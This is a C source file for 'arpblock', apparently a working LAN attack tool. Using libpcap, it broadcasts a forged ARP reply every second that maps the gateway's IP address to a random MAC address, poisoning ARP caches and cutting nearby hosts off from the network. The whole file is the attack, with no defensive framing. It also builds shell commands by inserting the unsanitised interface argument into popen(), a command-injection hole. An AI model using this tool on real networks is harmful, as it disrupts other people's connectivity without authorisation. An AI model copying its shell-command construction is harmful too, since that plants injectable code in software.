#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <memory.h>
#include <pcap.h>

#define FALSE 0
#define TRUE 1

typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned int DWORD;

#pragma pack(push, 1)
typedef struct _Ethernet
{
    BYTE Dst[6];
    BYTE Src[6];
    WORD Type;
} Ethernet;

typedef struct _ARP
{
    WORD HardwareType;
    WORD ProtocolType;
    BYTE HardwareSize;
    BYTE ProtocolSize;
    WORD Opcode;
    BYTE SenderMAC[6];
    union
    {
        struct
        {
            BYTE s_b1;
            BYTE s_b2;
            BYTE s_b3;
            BYTE s_b4;
        } S_un_b;
        DWORD S_addr;
    } SenderIP;
    BYTE TargetMAC[6];
    union
    {
        struct
        {
            BYTE s_b1;
            BYTE s_b2;
            BYTE s_b3;
            BYTE s_b4;
        } S_un_b;
        DWORD S_addr;
    } TargetIP;
} ARP;
#pragma pack(pop)

void get_mac(char *interface, unsigned char mac[])
{
    char command[64] = { 0 };
    char line[64] = { 0 };
    char data[20] = { 0 };

    sprintf(command, "ip address show scope link %s | grep \"link/ether\"", interface);

    FILE *fp = popen(command, "r");
    fgets(line, 64, fp);

    sscanf(line, "\tlink/ether %s brd", data);

    for (char *ptr = strtok(data, ":"), i = 0; ptr != NULL; ptr = strtok(NULL, ":"))
        mac[i++] = (unsigned char)strtol(ptr, NULL, 16);
}

unsigned int get_gateway(char *interface)
{
    char command[64] = { 0 };
    char line[64] = { 0 };
    char data[16] = { 0 };

    sprintf(command, "ip route show 0.0.0.0/0 dev %s", interface);

    FILE *fp = popen(command, "r");
    fgets(line, 64, fp);

    sscanf(line, "default via %s proto", data);

    return inet_addr(data);
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        puts("usage : arpblock <interface>");
        puts("example : arpblock wlan0");
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    BYTE ARPPacket[sizeof(Ethernet) + sizeof(ARP)] = { 0 };
    Ethernet *ethernet = ARPPacket;
    ARP *arp = ARPPacket + sizeof(Ethernet);



    memset(ethernet->Dst, 0xFF, 6);
    get_mac(dev, ethernet->Src);
    ethernet->Type = htons(0x0806);

    arp->HardwareType = htons(0x0001);
    arp->ProtocolType = htons(0x0800);
    arp->HardwareSize = 6;
    arp->ProtocolSize = 4;
    arp->Opcode = htons(0x0002);
    
    srand(time(NULL));
    for (int i = 0; i < 6; i++)
        arp->SenderMAC[i] = rand();
    arp->SenderIP.S_addr = get_gateway(dev);
    memset(arp->TargetMAC, NULL, 6);
    arp->TargetIP.S_addr = get_gateway(dev);

    while (TRUE)
    {
        int ret = pcap_sendpacket(pcap, ARPPacket, sizeof(ARPPacket));
        if (ret)
            printf("pcap_sendpacket failed\n");
        sleep(1);
    }

    return 0;
}